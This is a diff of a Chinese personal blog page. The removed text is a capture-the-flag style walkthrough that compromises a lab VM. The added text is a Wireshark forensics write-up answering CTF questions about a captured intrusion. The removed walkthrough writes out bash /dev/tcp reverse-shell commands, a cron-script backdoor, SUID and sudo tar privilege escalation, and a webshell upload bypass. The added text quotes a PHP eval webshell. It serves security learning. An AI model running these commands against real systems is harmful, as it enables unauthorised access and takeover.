@@ -24,7 +24,7 @@
 
   
 
-  <title>nivek | 可乐加冰</title>
+  <title>flag.pcapng | 可乐加冰</title>
 
   
 
@@ -98,18 +98,18 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">nivek</h1>
+          <h1 class="title-wrap">flag.pcapng</h1>
           <h2 class="title-sub-wrap">
             <strong>可乐加冰</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2021-12-15T10:12:35.000Z" itemprop="datePublished">2021-12-15</time>
+            <time  class="article-date" datetime="2021-12-17T00:30:44.000Z" itemprop="datePublished">2021-12-17</time>
           </h2>
           <ul class="wrap-list dark">
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/web%E6%B8%97%E9%80%8F/">🏷️ web渗透</a></li>
+    <li><a href="/tags/wireshark%E6%8A%93%E5%8C%85/">🏷️ wireshark抓包</a></li>
   
 </ul>
         </div>
@@ -133,15 +133,14 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p><strong>目标:获取2个flag值</strong><br><strong>1.对靶机端口版本进行探测</strong><br>    <img src="/images/1.png"><br>发现该靶机只有21ftp和22ssh,版本也未找到漏洞,上网查大佬们的博客才发现有个7080web端口<br><strong>2.进行访问是一个后台的登入页面</strong><br>    <img src="/images/2.png"><br>思路:1.用dirb进行爆破查找有没有字典存在2.用万能密码进行sql注入<br> 2.1 进行dirb目录扫描<br>    <img src="/images/3.png"><br>发现只有phpmyadmin数据库后台有用,没有账号密码一样没用啊只能换办法了<br> 2.2 sql注入万能密码注入<br>    <img src="/images/4.png"><br>发现需要有@符号才能进行写入,然后F12查看. 猜测前段代码限制了<br>    <img src="/images/5.png"><br>发现有type限制,把它删除后,在尝试一下万能密码注入进去了后台<br>    <img src="/images/6.png"><br>然后我一个一个按钮点击发现没有一个网页存在漏洞,就想F12查看有没有提示的隐藏文件<br>    <img src="/images/7.png"><br>在这里查看到一个setting.php的一个文件进行访问<br>    <img src="/images/8.png"></p>
-<p><strong>3.Getshell</strong><br>看了一下,有文件上传漏洞,话不多说写一句话木马,然后用burp进行抓包改包进行文件上传<br>    <img src="/images/9.png"><br>这个是文件上传最简单绕过只需要修改image/jpg就行了<br>    <img src="/images/10.png"><br>因为上传是一个php文件不是图片所以会显示不出来,然后右键它复制图像连接,然后用菜刀或者蚁剑连接得到一个shell<br>接下来用bash把shell反弹给kali<br>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.199.128/5555 0&gt;&amp;1’  //用bash把shell给出去<br>在kali上nc -lnvp 5555   //监听自己的端口</p>
-<p><strong>4.提权</strong><br>    <img src="/images/11.png"><br>在/home/local.txt文件中获取第一个flag<br>与此同时在/home目录下发现一个用户为eren想进去看看里面文件发现权限不够 现在就是需要先拿到eren的shell,之后我找了好久目录都没发现什么能提权,之后我就看了大佬的博客<br>输入find / -perm -4000 -type f -exec ls -al {} ; 2&gt;/dev/null可以查看到很多用户文件的权限<br>    <img src="/images/14.png"><br>看到eren用户 有个/usr/bin/bash的文件,然后直接/usr/bin/bash -p就具有eren权限<br>    <img src="/images/15.png"><br>查看/home 目录下eren用户目录<br>    <img src="/images/12.png"><br>思路:脚本文件可以在里面加入一个命令让他运行反弹一个shell命令从而拿到eren用户的shell<br>    <img src="/images/13.png"><br>查看定时任务发现每5分钟会备份一次就是说会运行一次里面指令,刚好符合我之前思路<br>输入echo “bash -i &gt;&amp; /dev/tcp/192.168.3.30/1234 0&gt;&amp;1” &gt;&gt; backup.sh此命令等他5分钟后备份后反弹一个shell<br>    <img src="/images/16.png"><br>同时在kali打开新的命令行nc -lnvp 2000监听等待反弹shell<br>    <img src="/images/17.png"><br>输入sudo -l可以进行提权,接着输入sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh进行提权<br>    <img src="/images/18.png"><br>具有root权限后进入root目录查看flag<br>    <img src="/images/19.png"><br><strong>记一次渗透完成</strong></p>
+        <p><strong>题目:1.分析flag.pcapng数据包文件找出黑客的ip地址,并将黑客的ip地址作为flag值(如:172.16.1.1)提交.</strong>   答案:10.0.0.129<br>思路:找出黑客一般爆破,sql注入,文件上传基本基于http上实现.<br>文件-到处对象-http可以查看http全部信息.<br><img src="/images/36.png"><br>看到异常的shell1.php猜测黑客是用文件上传进攻,找到10.0.0.130的流量就可以看到谁是黑客了.<br><img src="/images/37.png"><br>发现是10.0.0.129上传的. 所以10.0.0.129是黑客ip.<br><strong>题目:2.继续分析数据包文件flag.pcapng分析出黑客通过工具对目标服务器的哪些服务进行了暴力破解梅举渗透测试,将服务器对应端口依照从小到大的顺序依次排序作为flag值(如:77/88/99/166/188)</strong>  答案:21.3306<br>思路:先看黑客探测了什么端口,在判断黑客能爆破哪个服务 因为知道黑客ip单单看他流量就行了.<br><img src="/images/38.png"><br><img src="/images/39.png"><br><img src="/images/40.png"><br>黑客扫描了端口开启的有21.80.135.139.445.1025.1026.3306.3389 依据:因为端口扫描是进行不完全的tcp3握手导致出现红色错误数据.   现在思路:一般只有21.80.3306.3389端口进行爆破,已知80端口不可能爆破因为他是用文件上传手法进攻的 那么现在只剩下21.3306.3389.<br>验证:21端口<br><img src="/images/41.png"><br>查看到非常多爆破数据可以确定21端口被黑客爆破<br>验证:3306端口<br><img src="/images/42.png"><br>查看到mysql版本和爆破过程<br>剩下一个3389查看10.0.0.129的全部流量 因为是爆破肯定会造成大流量但是大概看了10.0.0.129的全部数据包没有一个3389的包除了扫描所以3389黑客没进行爆破<br><strong>题目:3.黑客扫描后可能直接对目标服务器的某个服务实施了攻击,继续查看数据包文件flag.pcapng分析出黑客成功破解了哪个服务的密码,并将该服务的版本号作为flag值(如:5.1.10)提交.</strong>   答案:5.1.73<br>思路:从上个题目得知黑客爆破了21和3306服务直接过滤在tcp追踪流就行了<br><img src="/images/43.png"><br>mysql数据库版本5.1.73这就出来了<br><strong>题目:4.继续分析数据包文件flag.pcapng,黑客通过数据库写入木马,将写入的木马名称作为flag值提交(名次不包含后缀).</strong>  答案:shell<br>思路:是通过数据库那么就是在爆破完后进行的写入<br><img src="/images/44.png"><br>从截图中流量可以看出黑客在进入数据库后写入了的是shell.php的木马.<br><strong>题目:5.继续分析数据包文件flag.pcapng ,黑客通过数据库写入木马,将黑客写入的一句话木马的连接密码作为flag值提交.</strong> 答案:cmd<br>思路:因为是通过数据库写入的木马那么查看数据库流量就行了,继续过滤mysql,然后追踪tcp流<br><img src="/images/45.png"><br>上图可看到<? evla($_POST['cmd']);?> 那么cmd就是他的密码<br><strong>题目:6.继续分析数据包flag.pcapng,找出黑客连接一句话木马后查看了什么文件,将黑客查看的文件名次作为flag值提交.</strong>   答案:flag.txt<br>思路:一句话木马 只有http和mysql数据库直接查看它们2流量就行了. 从上图中得知黑客连接数据库这是为了在网站目录写入名为shell1.php的木马 他想要拿到网站权限.所以mysql排除<br><img src="/images/46.png"><br>过滤只剩下http,追踪tcp流 查看到黑客在命令行输入dir后查看第一个文件是flag.txt的文件但是内容是什么继续往下查找<br><img src="/images/47.png"><br>查看到黑客查看的文件内容.<br><strong>题目:7.继续分析数据包文件flag.pcapng,找出黑客已经获取到目标服务器的基本信息,请将黑客获取到的目标服务器主机名作为flag值提交.</strong>  答案:SERVER 2003<br>思路:服务器基本信息就是找出服务器是什么版本,不可能在下面了,下面就是ftp的爆破了所以还是在http流量里面找.<br><img src="/images/48.png"><br>查看到是server 2003<br><strong>题目:8继续分析数据包文件flag.pcapng,黑客可能找到异常用户后再次对目标服务器的某个服务进行了密码暴力枚举渗透,成功破解出服务的密码后登入到服务器中下载了一张图片,将图片文件中的英文单纯作为flag值提交.</strong>  答案:flag{my_flag}<br>思路:从前面条件不用说肯定剩下最后一个ftp服务过滤就完事了,题目说下载了一张图片那么估计还要自己到出数据.<br><img src="/images/49.png"><br>在4160包中看到黑客拿到了flag.png图片,4161包是进行下载所以图片数据都在4161包中.<br><img src="/images/50.png"><br>右键到处分组字节就能获取到图片的全部源码然后查看就行了<br><img src="/images/51.png"><br>答案就出来了.</p>
 
       </section>
 
       
       
         <nav class="article-nav">
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -152,11 +151,10 @@
           <h2 class="card-text--title text-ellipsis">ino</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
